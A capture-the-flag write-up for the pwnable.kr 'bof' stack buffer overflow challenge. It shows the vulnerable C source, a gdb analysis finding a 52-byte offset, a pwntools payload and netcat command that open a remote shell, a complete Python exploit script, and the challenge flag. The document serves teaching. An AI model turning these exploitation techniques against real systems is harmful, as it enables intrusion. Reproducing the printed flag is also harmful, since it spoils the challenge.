# bof

## Instructions

Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

- Download: http://pwnable.kr/bin/bof
- Download: http://pwnable.kr/bin/bof.c
- Running at: `nc pwnable.kr 9000`

## step-by-step

Following the game instructions, you need to download the `bof` and `bof.c` files using the following commands:

```
┌──(kali㉿kali)-[~/pwnable.kr/bof]
└─$ wget http://pwnable.kr/bin/bof

┌──(kali㉿kali)-[~/pwnable.kr/bof]
└─$ wget http://pwnable.kr/bin/bof.c
```

Once the files have been downloaded you need to modify the permissions of the ELF file called `bof` by adding execute permissions with the following command:

```
┌──(kali㉿kali)-[~/pwnable.kr/bof]
└─$ chmod 700 bof
```

The game instructions provide us with another useful piece of information, namely that the ELF file `bof` is running on the hostname `pwnable.kr` on port `9000`, in fact, using the command recommended in the instructions and inserting, for example, the string `hello world!` we obtain:

```
┌──(kali㉿kali)-[~/pwnable.kr/bof]
└─$ nc pwnable.kr 9000
hello world!
overflow me : 
Nah..
```

to understand this behavior we need to analyze the `bof.c` source file:

```
┌──(kali㉿kali)-[~/pwnable.kr/bof]
└─$ cat bof.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

Well, let's just focus on the C language, so I'll write the code more plainly:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

> [!NOTE]
> I apologize for the very messy style but it wouldn't make sense to fix it because it is important to develop the ability to read, modify and exploit code written by others.

In this code we notice:

1. That in the code, and in particular in the `func()` function, the `gets()` function is used which is vulnerable to buffer overflow.
2. An `int key` corresponding to `0xdeadbeef` is passed to the `func()` function and if this key is equal to `0xcafebabe` then a shell is executed using the `system("/bin/sh");` instruction.

This means that we must use the `gets()` function to cause a buffer overflow that allows us to obtain equality between `key` and `0xcafebabe`. Let's do an initial test by inserting the `X` character a very high number of times:

```
┌──(kali㉿kali)-[~/pwnable.kr/bof]
└─$ nc pwnable.kr 9000
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
*** stack smashing detected ***: /home/bof/bof terminated
overflow me : 
Nah..
```

compared to the previous case, when we wrote `hello world!` we got the `stack smashing detected` message which occurs when a program detects an overwriting of the stack memory. What we need to do is understand exactly how many characters to insert so that the `key` can be overwritten with `0xcafebabe` and to do this we can use a fundamental tool namely the `gdb` degubber.

> [!NOTE]
> On Kali Linux there is normally no `gdb`, to install it you can use the `sudo apt install gdb` command.

Then using the `gdb ./bof` command we use the debugger with the `bof` ELF file:

```
┌──(kali㉿kali)-[~/pwnable.kr/bof]
└─$ gdb ./bof             
GNU gdb (Debian 13.2-1+b2) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./bof...
(No debugging symbols found in ./bof)
(gdb) 
```

now, remembering the structure of the `bof.c` source file, we insert a `break main` to interrupt the execution of the code and then run the program with the `r` command:

```
(gdb) break main
Breakpoint 1 at 0x68d
(gdb) r
Starting program: /home/kali/pwnable.kr/bof/bof 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x5655568d in main ()
(gdb) 
```

now we use `gdb` to disassemble the source `func()` function, since inside it the `gets()` function vulnerable to buffer overflow is called:

```
(gdb) disassemble func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   %ebp
   0x5655562d <+1>:     mov    %esp,%ebp
   0x5655562f <+3>:     sub    $0x48,%esp
   0x56555632 <+6>:     mov    %gs:0x14,%eax
   0x56555638 <+12>:    mov    %eax,-0xc(%ebp)
   0x5655563b <+15>:    xor    %eax,%eax
   0x5655563d <+17>:    movl   $0x5655578c,(%esp)
   0x56555644 <+24>:    call   0xf7def030 <puts>
   0x56555649 <+29>:    lea    -0x2c(%ebp),%eax
   0x5655564c <+32>:    mov    %eax,(%esp)
   0x5655564f <+35>:    call   0xf7dee580 <gets>
   0x56555654 <+40>:    cmpl   $0xcafebabe,0x8(%ebp)
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    movl   $0x5655579b,(%esp)
   0x56555664 <+56>:    call   0xf7dc7d00 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    movl   $0x565557a3,(%esp)
   0x56555672 <+70>:    call   0xf7def030 <puts>
   0x56555677 <+75>:    mov    -0xc(%ebp),%eax
   0x5655567a <+78>:    xor    %gs:0x14,%eax
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7eafb90 <__stack_chk_fail>
   0x56555688 <+92>:    leave
   0x56555689 <+93>:    ret
End of assembler dump.
(gdb) 
```

therefore analyzing the `Assembly` code we notice that the `%ebp` register is put on the top of the stack via the `push %ebp` instruction and then pointed by the 32-bit `%esp` stack pointer. We also note the instruction:

```
0x56555654 <+40>:    cmpl   $0xcafebabe,0x8(%ebp)
```

corresponds to the if construct of the `bof.c` source code and in particular the address `0xcafebabe` is compared with the address `0x8(%ebp)`, i.e. starting from the `%ebp` register the address is accessed with an offset of `0x8`. But the execution was blocked with the `break main` so we add a new break to the address of the compare `cmpl 0xcafebabe,0x8(%ebp)` and use the `c` command to continue the execution:

```
(gdb) break *0x56555654
Breakpoint 2 at 0x56555654
(gdb) c
Continuing.
overflow me : 
```

Now we insert the `X` character a random number of times without causing `stack smashing detected`:

```
(gdb) c
Continuing.
overflow me : 
XXXXXXXXXXXXXXXXXXXXXXXX

Breakpoint 2, 0x56555654 in func ()
(gdb) 
```

But knowing that the stack pointer `%esp` points to `%ebp` because the latter is at the top of the stack then we can examine the memory of the `%esp` register as follows:

```
(gdb) x/100 $esp
0xffffcf60:     0xffffcf7c      0xffffd23b      0x00000002      0x0000001c
0xffffcf70:     0xf7ffcfd8      0x00000028      0x00000000      0x58585858
0xffffcf80:     0x58585858      0x58585858      0x58585858      0x58585858
0xffffcf90:     0x58585858      0x00000000      0x00000000      0xe181f900
0xffffcfa0:     0xffffffff      0xf7d867f0      0xffffcfc8      0x5655569f
0xffffcfb0:     0xdeadbeef      0x00000000      0x00000000      0x00000000
0xffffcfc0:     0x00000000      0x00000000      0x00000000      0xf7d9dc65
0xffffcfd0:     0x00000001      0xffffd084      0xffffd08c      0xffffcff0
0xffffcfe0:     0xf7f9de34      0x5655568a      0x00000001      0xffffd084
0xffffcff0:     0xf7f9de34      0x565556b0      0xf7ffcb80      0x00000000
0xffffd000:     0x992ff25a      0xd508184a      0x00000000      0x00000000
0xffffd010:     0x00000000      0xf7ffcb80      0x00000000      0xe181f900
0xffffd020:     0xf7ffda30      0xf7d9dbf6      0xf7f9de34      0xf7d9dd28
0xffffd030:     0xf7fcaac4      0x56556ff4      0x00000001      0x56555530
0xffffd040:     0x00000000      0xf7fdbec0      0xf7d9dca9      0x56556ff4
0xffffd050:     0x00000001      0x56555530      0x00000000      0x56555561
0xffffd060:     0x5655568a      0x00000001      0xffffd084      0x565556b0
0xffffd070:     0x56555720      0xf7fcec80      0xffffd07c      0xf7ffda30
0xffffd080:     0x00000001      0xffffd250      0x00000000      0xffffd26e
0xffffd090:     0xffffd27d      0xffffd291      0xffffd2b4      0xffffd2ea
0xffffd0a0:     0xffffd30b      0xffffd318      0xffffd336      0xffffd352
0xffffd0b0:     0xffffd36e      0xffffd37e      0xffffd38b      0xffffd395
0xffffd0c0:     0xffffd3a2      0xffffd3c1      0xffffd41f      0xffffd43d
0xffffd0d0:     0xffffd458      0xffffd476      0xffffd489      0xffffd4a7
0xffffd0e0:     0xffffd4c2      0xffffd50e      0xffffd521      0xffffd534
```

In particular, among the `100` memory units that I asked to display with the `x/100 $esp` command there does not seem to be any trace of our input, i.e. `XXXXXXXXXXXXXXXXXXXXXXXX`. But knowing that the addresses are in hexadecimal, if we check the [ASCII code table](https://upload.wikimedia.org/wikipedia/commons/1/1b/ASCII-Table-wide.svg) we know that the single character `X` can be represented with `58` in hexadecimal. In fact, checking the previous output again we notice the presence of some repetitions which I report below for simplicity:

```
0xffffcf60:     0xffffcf7c      0xffffd23b      0x00000002      0x0000001c
0xffffcf70:     0xf7ffcfd8      0x00000028      0x00000000      0x58585858
0xffffcf80:     0x58585858      0x58585858      0x58585858      0x58585858
0xffffcf90:     0x58585858      0x00000000      0x00000000      0xe181f900
0xffffcfa0:     0xffffffff      0xf7d867f0      0xffffcfc8      0x5655569f
0xffffcfb0:     0xdeadbeef      0x00000000      0x00000000      0x00000000
...
```

and it is no coincidence that the address `0xdeadbeef` is also present among them. In particular we notice 3 rows made up of 4 columns which initially show the address `0x58585858` (i.e. the sequence `XXXX` of 4 characters) repeated several times and subsequently apparently random addresses until arriving at the address `0xdeadbeef` which must be replaced with the address `0xcafebabe`. Furthermore, in the last column there is another address `0x58585858`, so in total we have `3 * 4 + 1 = 13` addresses. So, `13` addresses before arriving at the address `0xdeadbeef` and each of these addresses represents 4 characters, so with `13 * 4 = 52` characters you arrive at the address `0xdeadbeef`.

> [!NOTE]
> To exit `gdb` you can use the `q` command.

So our payload will be composed of a sequence of `52` characters, for example all `X`, followed by the address `0xcafebabe` which will need to be packed. So before creating our exploit in `Python` let's try to see for which architecture the ELF file `bof` can be executed. To do this we use the `readelf` command as follows:

```
┌──(kali㉿kali)-[~/pwnable.kr/bof]
└─$ readelf -h bof
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              DYN (Shared object file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x530
  Start of program headers:          52 (bytes into file)
  Start of section headers:          4428 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         9
  Size of section headers:           40 (bytes)
  Number of section headers:         30
  Section header string table index: 27
```

as can be understood, it is an ELF file for a 32-bit architecture. This last information is important because we need to prepare the strings to inject into the code. Then using the following command:

```
┌──(kali㉿kali)-[~/pwnable.kr/bof]
└─$ python -c "from pwn import *; import sys; sys.stdout.buffer.write(b'X' * 52 + p32(0xcafebabe))" > payload
```

in particular `p32()` is used to package `0xcafebabe` into 32-bit little endian transforming it into `\xbe\xba\xfe\xca`. Furthermore the output is redirected inside a file called `payload`.

Now we need to find a way to send the contents of the `payload` file to the program running on the hostname `pwnable.kr` on port `9000`. To view the contents of the `payload` file we can use the `cat` command which in turn, if no parameters are specified, will take the characters from `stdin` as input and output them to `stdout`. So what we can do is create a sub-shell that takes as input, via `cat`, the contents of the `payload` file and subsequently pipes it as input to the program running on the hostname `pwnable.kr` on port `9000`. To do all this we can use this command:

```
┌──(kali㉿kali)-[~/pwnable.kr/bof]
└─$ (cat payload && cat) | nc pwnable.kr 9000
```

Once we press `ENTER` nothing will happen but in reality we have actually hacked the program and the shell has been opened. To confirm this we use, within the same terminal, the following command:

```
┌──(kali㉿kali)-[~/pwnable.kr/bof]
└─$ (cat payload && cat) | nc pwnable.kr 9000
python -c "import pty; pty.spawn('/bin/bash')"
bof@pwnable:~$
```

thanks to the command `python -c "import pty; pty.spawn('/bin/bash')"` we are able to show `bof@pwnable:~$` which is nothing other than the shell that is running. Therefore using the `ls` command we get:

```
bof@pwnable:~$ ls  
bof  bof.c  flag  log  super.pl
```

and finally we display the contents of the `flag` file:

```
bof@pwnable:~$ cat flag
daddy, I just pwned a buFFer :)
```

Perfect, everything went according to plan! So as you can imagine the flag you are looking for is the following sentence:

```
daddy, I just pwned a buFFer :)
```

## Exploitation

Finally, we can use the following exploit, written in `Python`, to replicate the vulnerability in a fully automated way:

```python
from pwn import *
import argparse

def get_flag(payload, is_interactive):
    shell = remote("pwnable.kr", 9000)
    shell.send(payload)

    if is_interactive:
        shell.interactive()
    else:
        for _ in range(2):
            shell.sendline(b"cat flag")
            flag = shell.recv(timeout=1).decode().strip()
        log.success(f"Flag: \"{flag}\"")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interactive", dest="interactive", action="store_true", required=False, help="Use an interactive shell.")

    args = parser.parse_args()
    # print(args)

    hex = 0xcafebabe
    offset = 52 # calculated by Assembly code
    payload = b"X" * offset + p32(hex)
    
    get_flag(payload, args.interactive)

if __name__ == "__main__":
    main()
```

then using the `python exploit.py` command we get:

```
[+] Opening connection to pwnable.kr on port 9000: Done
[+] Flag: "daddy, I just pwned a buFFer :)"
[*] Closed connection to pwnable.kr port 9000
```

or using `python exploit.py -i` command we get:

```
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$  
```

and then we manually insert `cat flag` command:

```
$ cat flag
daddy, I just pwned a buFFer :)
$ 
[*] Interrupted
[*] Closed connection to pwnable.kr port 9000
```

> [!WARNING]
> If you don't get the output when using the commands you need to repeat the command again.
